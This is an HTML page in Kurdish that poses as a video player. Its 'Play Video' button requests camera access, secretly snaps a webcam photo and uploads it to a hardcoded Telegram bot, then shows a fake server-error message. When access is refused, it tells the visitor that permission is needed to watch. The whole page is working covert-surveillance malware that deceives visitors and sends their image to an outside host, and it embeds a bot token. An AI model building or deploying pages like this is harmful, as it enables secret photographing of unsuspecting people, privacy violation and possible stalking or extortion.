<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #121212;
            /* باگراوەندی دیواری بەردین وەک وێنەکە */
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px),
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
            /* فۆنتە نوێیە شیکەکە */
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            text-align: center;
        }

        #main-container {
            background: rgba(20, 20, 20, 0.98);
            padding: 60px 30px;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 30px 60px rgba(0,0,0,1);
            width: 85%;
            max-width: 360px;
            backdrop-filter: blur(20px);
        }

        h2 {
            color: #ffffff;
            margin-bottom: 40px;
            font-size: 26px;
            font-weight: 500; /* کەمێک باریک و شیک */
            letter-spacing: -0.2px;
            line-height: 1.6;
        }

        #startBtn {
            padding: 16px 45px;
            font-size: 19px;
            border-radius: 14px;
            border: none;
            background: #ffffff;
            color: #000000;
            font-weight: 700;
            cursor: pointer;
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 30px rgba(255,255,255,0.05);
        }

        #startBtn:hover {
            transform: scale(1.05);
            box-shadow: 0 15px 35px rgba(255,255,255,0.1);
        }

        #startBtn:active {
            transform: scale(0.95);
        }

        #status {
            color: #888888;
            margin-top: 30px;
            font-size: 15px;
            font-weight: 300;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
